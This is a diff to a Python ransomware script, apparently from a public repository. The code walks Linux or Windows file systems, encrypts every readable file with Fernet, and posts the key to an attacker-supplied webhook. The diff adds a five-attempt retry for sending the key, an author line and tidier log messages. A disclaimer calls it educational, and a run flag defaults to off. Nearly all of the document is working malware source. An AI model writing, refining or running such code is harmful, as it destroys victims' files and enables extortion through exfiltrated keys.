@@ -3,6 +3,8 @@ from cryptography.fernet import Fernet
 from requests import post
 from string import ascii_uppercase
 
+# Author Karbasi
+
 # The code provided in this repository is for educational and informational purposes only.
 # I do not take any responsibility for any misuse or damage that may result from the use of this code.
 # Use it at your own risk.
@@ -10,24 +12,28 @@ from string import ascii_uppercase
 Run_it_at_your_own_RISK = 0
 webhook = "Your webhook API"  # change this to your webhook API
 
+
 def key_sender(data):
-    try:
-        post(webhook, data)
-        print("[+]successful sent the key to webhook")
-    except Exception as e:
-        print("[-]failed to send the key, error: ", e)
+    # how many tries for sending the key just in case
+    for tries in range(5):
+        try:
+            post(webhook, data)
+            print("[+] Successful sent the key to webhook")
+            break
+        except Exception as e:
+            print("[-] Failed to send the key, ERROR: ", e)
 
 def filereader(file: str):
     with open(file, "rb") as f:
         data = f.read()
-    print(f"[+]reading {file}")
+    print(f"[+] Reading {file}")
     filewriter(file, tool.encrypt(data))
 
 
 def filewriter(file: str, data: bytes):
     with open(file, 'wb') as f:
         f.write(data)
-        print(f"[+]encrypted {file}")
+        print(f"[+] Encrypted {file}")
 
 def linux_walker():
     file = None
@@ -41,11 +47,12 @@ def linux_walker():
                 else:
                     filereader(filepath)
         except PermissionError:
-            print(f"[-]permission error to read/encrypt {file}")
+            print(f"[-] Permission Error: Unable to read/encrypt {file}")
         except FileNotFoundError:
-            print(f"[-]file not found: {file}")
+            print(f"[-] File Not Found: {file}")
         except Exception as e:
-            print(f"[-]failed to encrypt {file}: {e}")
+            print(f"[-] Failed to encrypt {file}: {e}")
+
 
 def windows_walker():
     file = None
@@ -64,11 +71,11 @@ def windows_walker():
                     else:
                         filereader(filepath)
             except PermissionError:
-                print(f"[-]permission error to read/encrypt {file}")
+                print(f"[-] Permission Error: Unable to read/encrypt {file}")
             except FileNotFoundError:
-                print(f"[-]file not found: {file}")
+                print(f"[-] File Not Found: {file}")
             except Exception as e:
-                print(f"[-]failed to encrypt {file}: {e}")
+                print(f"[-] Failed to encrypt {file}: {e}")
 
 
 if Run_it_at_your_own_RISK != 0:
@@ -81,4 +88,4 @@ if Run_it_at_your_own_RISK != 0:
     elif os.name == "nt":
         windows_walker()
     else:
-        print("system is not supported.")
+        print("[!] System is not supported.")
